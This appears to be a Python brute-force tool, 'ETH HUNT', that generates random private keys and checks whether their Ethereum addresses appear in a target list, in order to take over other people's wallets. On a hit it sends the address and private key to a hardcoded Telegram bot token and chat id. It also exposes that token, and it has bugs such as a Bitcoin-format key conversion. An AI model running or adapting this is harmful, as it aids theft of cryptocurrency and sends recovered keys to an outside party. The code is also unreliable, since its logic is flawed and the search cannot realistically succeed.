# -*- coding: utf-8 -*-
#import bit, binascii
import random, time, sys, os, hmac, struct, datetime, subprocess, secrets
from random import randint, shuffle
from secrets import choice
import secp256k1 as ice
import multiprocessing, multiprocessing.pool, threading, logging, traceback, concurrent.futures, re
import requests
from threading import Lock, Thread, enumerate
from multiprocessing import Event, Process, Queue, Value, cpu_count

eth_address_list = [line.split()[0].lower() for line in open("eth.txt",'r')]
eth_address_list = set(eth_address_list)

group_size = 1000000
 
token = '6022882960:AAHNfhS7j0UUZCqe-7pEt_MVCOYEtpdB0k8' 
method = 'sendMessage'
user_id = '5906565231'

def sendBotMsg(msg):
     response = requests.post(
        url=f'https://api.telegram.org/bot{token}/{method}',
        data={'chat_id': {user_id}, 'text': {msg}}
    )

def hunt_ETH_address(cores='all'):

    try:
        available_cores = cpu_count()
    
        if cores == 'all':
            cores = available_cores
        elif 0 < int(cores) <= available_cores:
            cores = int(cores)
        else:
            cores = 1
    
        counter = Value('Q')
        match = Event()
        queue = Queue()
    
        workers = []
        for r in range(cores):
            p = Process(target=generate_key_address_pairs, args=(counter, match, queue, r, startscan, stopscan))
            workers.append(p)
            p.start()
    
        for worker in workers:
            worker.join()
    
    except(KeyboardInterrupt, SystemExit):
        exit('\nSIGINT or CTRL-C detected. Exiting gracefully. BYE')

    private_key, address = queue.get()
    print('\n\nPrivate Key(hex):', hex(private_key))
    wif_key = ice.btc_pvk_to_wif(private_key, False)
    print('Private Key(wif): {}\n' 'ETH Address:      {}'.format(wif_key, address))
    msg ='Address: {} | Private Key: {}'.format(address, wif_key)
    sendBotMsg(msg)
    with open("winner.txt", "a") as f:
        f.write(f"""\nPrivate Key In DEC :  {private_key}
Privatekey in HEX  : {hex(private_key)}
Public Address ETH:  {address}""")
    return

def generate_key_address_pairs(counter, match, queue, r, startscan, stopscan):
    st = time.time()
    key_int = random.SystemRandom().randint(startscan,stopscan)
    P = ice.scalar_multiplication(key_int)
    current_pvk = key_int + 1
    print('+ Starting Thread:', r, 'Base: ',hex(key_int))
    while True:
        try:
            if match.is_set():
                return
            with counter.get_lock():
                counter.value += group_size
            Pv = ice.point_sequential_increment(group_size, P)
            for t in range(group_size):
                this_eth = ice.pubkey_to_ETH_address(Pv[t*65:t*65+65])
                if this_eth in eth_address_list:
                    match.set()
                    queue.put_nowait((current_pvk+t, this_eth))
                    return
            if (counter.value)%group_size == 0:
                print('> Total: {0}  [ Speed: {1:.2f} Keys/s ]  ETH: {2}'.format(counter.value, counter.value/(time.time() - st), this_eth))
            P = Pv[-65:]
            current_pvk += group_size
        except(KeyboardInterrupt, SystemExit):
            break

if __name__ == '__main__':
    prompt= '''
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ 
ETH HUNT | COLLISON WITH ETHEREUM ADDRESS
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

1 = ETH Random Bits
2 = ETH Random Bytes

>> Type Your Choice Here : '''

    promptstart=int(input(prompt))
    if promptstart == 1:
        print('---------------------------------')
        x=int(input("> Start Range Bits Min (1-255) : "))
        y=int(input("> Stop Range Bits Max (256) : "))
        print('---------------------------------')
        cpucores =int(input(">>> How Many CPU to Use : "))
        startscan=2**x
        stopscan=2**y
        
    if promptstart == 2:    
        print('---------------------------------')
        startscan=int(input("Range Min Bytes 1-115792089237316195423570985008687907852837564279074904382605163141518161494335 : "))
        stopscan=int(input("Range Max Bytes 115792089237316195423570985008687907852837564279074904382605163141518161494336 : "))
        print('---------------------------------')
        cpucores =int(input(">>> How many CPU to use =  "))
    print('')
    print('[+] STARTING SEARCH... PLEASE WAIT ')
    print('')
    hunt_ETH_address(cores = cpucores)
